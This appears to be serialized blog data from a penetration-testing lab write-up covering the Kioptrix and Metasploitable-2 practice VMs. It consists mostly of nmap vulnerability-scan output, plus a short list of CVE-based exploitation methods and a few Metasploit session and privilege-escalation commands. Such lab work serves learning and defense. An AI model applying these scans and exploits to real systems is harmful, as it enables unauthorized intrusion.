Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.securityfocus.com/bid/74733\&quot;&gt;https://www.securityfocus.com/bid/74733&lt;/a&gt;\n|&lt;br&gt;\n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|&lt;/em&gt;      &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n|&lt;em&gt;http-dombased-xss: Couldn’t find any DOM based XSS.\n| ssl-ccs-injection:\n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the “CCS Injection” vulnerability.\n|&lt;br&gt;\n|     References:\n|       &lt;a href=\&quot;http://www.openssl.org/news/secadv_20140605.txt\&quot;&gt;http://www.openssl.org/news/secadv_20140605.txt&lt;/a&gt;\n|       &lt;a href=\&quot;http://www.cvedetails.com/cve/2014-0224\&quot;&gt;http://www.cvedetails.com/cve/2014-0224&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224&lt;/a&gt;\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|&lt;em&gt;http-csrf: Couldn’t find any CSRF vulnerabilities.\n| ssl-poodle:\n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the “POODLE” issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_3DES_EDE_CBC_SHA\n|     References:\n|       &lt;a href=\&quot;https://www.openssl.org/~bodo/ssl-poodle.pdf\&quot;&gt;https://www.openssl.org/~bodo/ssl-poodle.pdf&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.imperialviolet.org/2014/10/14/poodle.html\&quot;&gt;https://www.imperialviolet.org/2014/10/14/poodle.html&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://www.securityfocus.com/bid/70574\&quot;&gt;https://www.securityfocus.com/bid/70574&lt;/a&gt;\n|_http-stored-xss: Couldn’t find any stored XSS vulnerabilities.\n|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)\n|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)\n|_sslv2-drown: ERROR: Script execution failed (use -d to debug)\n1024/tcp open  status      1 (RPC #100024)\nMAC Address: 00:0C:29:7C:3A:16 (VMware)&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Host script results:\n| smb-vuln-cve2009-3103:\n|   VULNERABLE:\n|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2009-3103\n|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,\n|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a\n|           denial of service (system crash) via an &amp;#x26; (ampersand) character in a Process ID High header field in a NEGOTIATE\n|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,\n|           aka “SMBv2 Negotiation Vulnerability.”\n|&lt;br&gt;\n|     Disclosure date: 2009-09-08\n|     References:\n|       &lt;a href=\&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\&quot;&gt;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103&lt;/a&gt;\n|_      &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103&lt;/a&gt;\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]&lt;/p&gt;\n&lt;p&gt;Service detection performed. Please report any incorrect results at &lt;a href=\&quot;https://nmap.org/submit/\&quot;&gt;https://nmap.org/submit/&lt;/a&gt; .\nNmap done: 1 IP address (1 host up) scanned in 356.82 seconds`&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1--samba&quot;],&quot;text&quot;:[0,&quot;Method-1  Samba&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-2-openfuck-mod_ssl-vulnerability&quot;],&quot;text&quot;:[0,&quot;Method-2 OpenFuck mod_ssl vulnerability&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1679306030928.png&quot;],[0,&quot;img/1679366939593.png&quot;],[0,&quot;img/1679366949376.png&quot;],[0,&quot;img/1679366954478.png&quot;],[0,&quot;img/1678960944499.png&quot;],[0,&quot;img/1678960950947.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 1&quot;],&quot;date&quot;:[3,&quot;2023-03-20T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1679306030928.png&quot;],[0,&quot;img/1679366939593.png&quot;],[0,&quot;img/1679366949376.png&quot;],[0,&quot;img/1679366954478.png&quot;],[0,&quot;img/1678960944499.png&quot;],[0,&quot;img/1678960950947.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/10&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/metasploitable-2&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Metasploitable-2&quot;],&quot;date&quot;:[3,&quot;2023-03-20T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;Information Gathering\n```\nnetdiscover -r 192.168.124.0/24\nsudo nmap -sV -O -Pn -T4 192.168.124.32 -p-\nnmap --script vuln 192.168.124.32 -p- \n```\nThe scanning result is as enclosure.\n***\n# Mehod1:CVE-2007-2447\nSame as metasploitable-1,method1\n***\n# Method2:CVE-2011-2523\n ![](img/1675307808514.gif)\n ![](img/1675307841182.gif)\n ![](img/1675307847800.gif)\nit&#39;s \&quot;root\&quot; user\n ![](img/1675307860348.gif)\n ***\n# Method3:CVE-2004-2687\n ![](img/1675307882873.gif)\n ![](img/1675307890322.gif)\nPrivilege escalation is as follows\nchange shell to meterpreter\n ![](img/1675307945242.gif)\n Execute commond as follows:\n ```\nset sessoin 1\nexploit \nsessions -i 2\nshell\nupload linux-exploit-suggester\n```\n ![](img/1675307951578.gif)\nRemember add implement privilege to what you upload\n ![](img/1675307968824.gif)\n ![](img/1675307977375.gif)\nTry to escalate privilege by CVE-2018-14665\n ![](img/1675307983061.gif)\nFailed,What a pity.\nUse the method in previous hub.\n ![](img/1675307989107.gif)\nremove the suffix name of the public key,then it&#39;s the private key.\n ![](img/1675308017931.gif)\n ***\n# Method4:CVE-2012-1823\n ![](img/1675308052350.gif)\n ![](img/1675308066038.gif)\nNeed privilege escalaion again\n***\n# Enclosure\n┌──(kali㉿kali)-[~]\n└─$ nmap --script vuln 192.168.124.32 -p-     \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 21:54 EDT\nNmap scan report for bogon (192.168.124.32)\nHost is up (0.0020s latency).\nNot shown: 65505 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n21/tcp    open  ftp\n| ftp-vsftpd-backdoor: \n|   VULNERABLE:\n|   vsFTPd version 2.3.4 backdoor\n|     State: VULNERABLE (Exploitable)\n|     IDs:  BID:48539  CVE:CVE-2011-2523\n|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.\n|     Disclosure date: 2011-07-03\n|     Exploit results:\n|       Shell command: id\n|       Results: uid=0(root) gid=0(root)\n|     References:\n|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb\n|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523\n|_      https://www.securityfocus.com/bid/48539\n22/tcp    open  ssh\n23/tcp    open  telnet\n25/tcp    open  smtp\n| ssl-poodle: \n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_AES_128_CBC_SHA\n|     References:\n|       https://www.securityfocus.com/bid/70574\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n|       https://www.imperialviolet.org/2014/10/14/poodle.html\n|_      https://www.openssl.org/~bodo/ssl-poodle.pdf\n|_sslv2-drown: ERROR: Script execution failed (use -d to debug)\n| smtp-vuln-cve2010-4344: \n|_  The SMTP server is not Exim: NOT VULNERABLE\n| ssl-dh-params: \n|   VULNERABLE:\n|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use anonymous\n|       Diffie-Hellman key exchange only provide protection against passive\n|       eavesdropping, and are vulnerable to active man-in-the-middle attacks\n|       which could completely compromise the confidentiality and integrity\n|       of any data exchanged over the resulting session.\n|     Check results:\n|       ANONYMOUS DH GROUP 1\n|             Cipher Suite: TLS_DH_anon_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: postfix builtin\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|       https://www.ietf.org/rfc/rfc2246.txt\n|   \n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\n|       https://www.securityfocus.com/bid/74733\n|       https://weakdh.org\n|   \n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: postfix builtin\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      https://weakdh.org\n53/tcp    open  domain\n80/tcp    open  http\n| http-enum: \n|   /tikiwiki/: Tikiwiki\n|   /test/: Test page\n|   /phpinfo.php: Possible information file\n|   /phpMyAdmin/: phpMyAdmin\n|   /doc/: Potentially interesting directory w/ listing on &#39;apache/2.2.8 (ubuntu) dav/2&#39;\n|   /icons/: Potentially interesting folder w/ directory listing\n|_  /index/: Potentially interesting folder\n|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.\n|_http-phpself-xss: ERROR: Script execution failed (use -d to debug)\n|_http-trace: TRACE is enabled\n|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n111/tcp   open  rpcbind\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n512/tcp   open  exec\n513/tcp   open  login\n514/tcp   open  shell\n1099/tcp  open  rmiregistry\n| rmi-vuln-classloader: \n|   VULNERABLE:\n|   RMI registry default configuration remote code execution vulnerability\n|     State: VULNERABLE\n|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.\n|       \n|     References:\n|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb\n1524/tcp  open  ingreslock\n2049/tcp  open  nfs\n2121/tcp  open  ccproxy-ftp\n3306/tcp  open  mysql\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n3632/tcp  open  distccd\n| distcc-cve2004-2687: \n|   VULNERABLE:\n|   distcc Daemon Command Execution\n|     State: VULNERABLE (Exploitable)\n|     IDs:  CVE:CVE-2004-2687\n|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)\n|       Allows executing of arbitrary commands on systems running distccd 3.1 and\n|       earlier. The vulnerability is the consequence of weak service configuration.\n|       \n|     Disclosure date: 2002-02-01\n|     Extra information:\n|       \n|     uid=1(daemon) gid=1(daemon) groups=1(daemon)\n|   \n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687\n|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687\n|_      https://distcc.github.io/security.html\n5432/tcp  open  postgresql\n| ssl-poodle: \n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_AES_128_CBC_SHA\n|     References:\n|       https://www.securityfocus.com/bid/70574\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n|       https://www.imperialviolet.org/2014/10/14/poodle.html\n|_      https://www.openssl.org/~bodo/ssl-poodle.pdf\n| ssl-dh-params: \n|   VULNERABLE:\n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      https://weakdh.org\n| ssl-ccs-injection: \n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the \&quot;CCS Injection\&quot; vulnerability.\n|           \n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\n|       http://www.openssl.org/news/secadv_20140605.txt\n|_      http://www.cvedetails.com/cve/2014-0224\n5900/tcp  open  vnc\n6000/tcp  open  X11\n6667/tcp  open  irc\n| irc-botnet-channels: \n|_  ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email admin@Metasploitable.LAN for more information.\n6697/tcp  open  ircs-u\n| irc-botnet-channels: \n|_  ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email admin@Metasploitable.LAN for more information.\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n8009/tcp  open  ajp13\n8180/tcp  open  unknown\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server&#39;s resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       http://ha.ckers.org/slowloris/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n| http-enum: \n|   /admin/: Possible admin folder\n|   /admin/index.html: Possible admin folder\n|   /admin/login.html: Possible admin folder\n|   /admin/admin.html: Possible admin folder\n|   /admin/account.html: Possible admin folder\n|   /admin/admin_login.html: Possible admin folder\n|   /admin/home.html: Possible admin folder\n|   /admin/admin-login.html: Possible admin folder\n|   /admin/adminLogin.html: Possible admin folder\n|   /admin/controlpanel.html: Possible admin folder\n|   /admin/cp.html: Possible admin folder\n|   /admin/index.jsp: Possible admin folder\n|   /admin/login.jsp: Possible admin folder\n|   /admin/admin.jsp: Possible admin folder\n|   /admin/home.jsp: Possible admin folder\n|   /admin/controlpanel.jsp: Possible admin folder\n|   /admin/admin-login.jsp: Possible admin folder\n|   /admin/cp.jsp: Possible admin folder\n|   /admin/account.jsp: Possible admin folder\n|   /admin/admin_login.jsp: Possible admin folder\n|   /admin/adminLogin.jsp: Possible admin folder\n|   /manager/html/upload: Apache Tomcat (401 Unauthorized)\n|   /manager/html: Apache Tomcat (401 Unauthorized)\n|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload\n|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload\n|   /admin/jscript/upload.html: Lizard Cart/Remote File upload\n|_  /webdav/: Potentially interesting folder\n8787/tcp  open  msgsrvr\n38316/tcp open  unknown\n44372/tcp open  unknown\n50889/tcp open  unknown\n55138/tcp open  unknown\n\nHost script results:\n|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: false\n\nNmap done: 1 IP address (1 host up) scanned in 322.11 seconds&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Metasploitable-2.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1675307808514.gif&quot;],[0,&quot;img/1675307841182.gif&quot;],[0,&quot;img/1675307847800.gif&quot;],[0,&quot;img/1675307860348.gif&quot;],[0,&quot;img/1675307882873.gif&quot;],[0,&quot;img/1675307890322.gif&quot;],[0,&quot;img/1675307945242.gif&quot;],[0,&quot;img/1675307951578.gif&quot;],[0,&quot;img/1675307968824.gif&quot;],[0,&quot;img/1675307977375.gif&quot;],[0,&quot;img/1675307983061.gif&quot;],[0,&quot;img/1675307989107.gif&quot;],[0,&quot;img/1675308017931.gif&quot;],[0,&quot;img/1675308052350.gif&quot;],[0,&quot;img/1675308066038.gif&quot;]]],&quot;digest&quot;:[0,&quot;b5472763c5cdf262&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;p&gt;Information Gathering&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo nmap -sV -O -Pn -T4 192.168.124.32 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.32 -p- &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;The scanning result is as enclosure.&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;mehod1cve-2007-2447\&quot;&gt;Mehod1:CVE-2007-2447&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#mehod1cve-2007-2447\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;Same as metasploitable-1,method1&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method2cve-2011-2523\&quot;&gt;Method2:CVE-2011-2523&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method2cve-2011-2523\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307808514.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307841182.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307847800.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nit’s “root” user\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307860348.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method3cve-2004-2687\&quot;&gt;Method3:CVE-2004-2687&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method3cve-2004-2687\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307882873.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307890322.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nPrivilege escalation is as follows\nchange shell to meterpreter\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307945242.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nExecute commond as follows:&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;set sessoin 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;exploit &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sessions -i 2&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;shell&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;upload linux-exploit-suggester&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img 